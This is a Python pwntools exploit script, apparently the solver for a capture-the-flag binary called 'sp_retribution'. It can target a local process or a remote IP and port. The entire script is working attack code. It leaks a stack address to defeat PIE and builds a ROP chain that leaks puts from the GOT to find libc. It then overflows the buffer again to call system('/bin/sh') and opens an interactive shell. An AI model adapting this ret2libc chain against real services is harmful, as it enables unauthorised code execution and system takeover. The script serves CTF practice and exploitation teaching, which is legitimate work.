#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './sp_retribution' 
elf = context.binary = ELF(fname, checksec=False)
libc = elf.libc

os.system('clear')

if len(sys.argv) < 2:
  print('Running solver locally..\n')
  r    = process(fname)
  # r = gdb.debug(fname, gdbscript='break main\ncontinue')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b'y = ', b'A'*7)
data = r.recvuntil(b'(y/n): ').split(b'\n')
addr_on_stack_p = data[-2]
# print(len(addr_on_stack_p) # 6
addr_on_stack = u64(addr_on_stack_p + b'\x00\x00')
bin_base = addr_on_stack >> 16 << 16
success(f'Binary base @ {hex(bin_base)}')
elf.address = bin_base

rop = ROP(elf)
payload = b'\x90' * 88
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.missile_launcher)
r.sendline(payload)

data = r.recvuntil(b'y = ').split(b'\n')
# print(len(data[2])) => 6
addr_puts = u64(data[2] + b'\x00\x00')
libc_base = addr_puts - libc.symbols.puts
libc.address = libc_base

payload = b'\x90' * 88
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search('/bin/sh')))
payload += p64(libc.symbols.system)
r.sendlineafter(b'y = ', b'')
r.sendlineafter(b'(y/n): ', payload)

r.interactive()
